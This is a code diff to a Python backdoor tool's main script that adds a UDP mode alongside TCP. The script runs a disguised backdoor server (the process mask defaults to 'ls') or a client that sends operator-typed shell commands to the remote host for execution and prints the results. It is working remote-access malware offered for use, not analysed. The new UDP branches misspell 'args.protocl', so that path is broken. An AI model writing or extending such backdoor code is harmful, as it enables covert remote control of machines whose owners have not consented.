@@ -11,6 +11,7 @@ DEFAULT_MASK="ls"
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("mode", help="the mode in which the application will run", choices=["client","server"])
+    parser.add_argument("protocol", help="the protocol the application will use", choices=["tcp","udp"])
     parser.add_argument("lport", help="the listening port (1-65535 inclusive) for receiving requests or responses", type=int)
     parser.add_argument("dport", help="the destination port (1-65535 inclusive) on the remote host", type=int)
     parser.add_argument("-p", "--password", help="the password to use for authentication (must be the same on client and server); if unspecified, a default is used")
@@ -42,29 +43,56 @@ def main():
     key = utils.make_32_byte_str(args.key) if args.key else DEFAULT_KEY
   
     if args.mode == "server":
-        mask = args.mask if args.mask else DEFAULT_MASK
-        server = backdoor.TcpBackdoorServer(mask, key, pw, args.lport, args.dport)
-        server.run()
+        if args.protocol == "tcp":
+            mask = args.mask if args.mask else DEFAULT_MASK
+            server = backdoor.TcpBackdoorServer(mask, key, pw, args.lport, args.dport)
+            server.run()
+        elif args.protocl == "udp":
+            mask = args.mask if args.mask else DEFAULT_MASK
+            server = backdoor.UdpBackdoorServer(mask, key, pw, args.lport, args.dport)
+            server.run()            
     else:
-        client = backdoor.TcpBackdoorClient(key, pw, args.lport, args.dport, args.server)
-        client.connect()
+        if args.protocol == "tcp":
+            client = backdoor.TcpBackdoorClient(key, pw, args.lport, args.dport, args.server)
+            client.connect()
 
-        # read commands from the user until they exit
-        while True:
-            try:
-                cmd_str = raw_input("Enter a command to execute on the server: ")
-                cmd = command.ShellCommand(cmd_str)
-            except (EOFError, KeyboardInterrupt):
-                print("Exiting...")
-                cmd = command.EndCommand()
+            # read commands from the user until they exit
+            while True:
+                try:
+                    cmd_str = raw_input("Enter a command to execute on the server: ")
+                    cmd = command.ShellCommand(cmd_str)
+                except (EOFError, KeyboardInterrupt):
+                    print("Exiting...")
+                    cmd = command.EndCommand()
+                    client.send_command(cmd)
+                    break
+
+                # No exception - try to have the server execute this
                 client.send_command(cmd)
-                break
+                result = client.recv_result()
+                print("Received result:")
+                print(str(result))
 
-            # No exception - try to have the server execute this
-            client.send_command(cmd)
-            result = client.recv_result()
-            print("Received result:")
-            print(str(result))
+        elif args.protocl == "udp":        
+            client = backdoor.UdpBackdoorClient(key, pw, args.lport, args.dport, args.server)
+            client.connect()
+
+            # read commands from the user until they exit
+            while True:
+                try:
+                    cmd_str = raw_input("Enter a command to execute on the server: ")
+                    cmd = command.ShellCommand(cmd_str)
+                except (EOFError, KeyboardInterrupt):
+                    print("Exiting...")
+                    cmd = command.EndCommand()
+                    client.send_command(cmd)
+                    break
+
+                # No exception - try to have the server execute this
+                client.send_command(cmd)
+                result = client.recv_result()
+                print("Received result:")
+                print(str(result))
 
 if __name__ == "__main__":
     main()
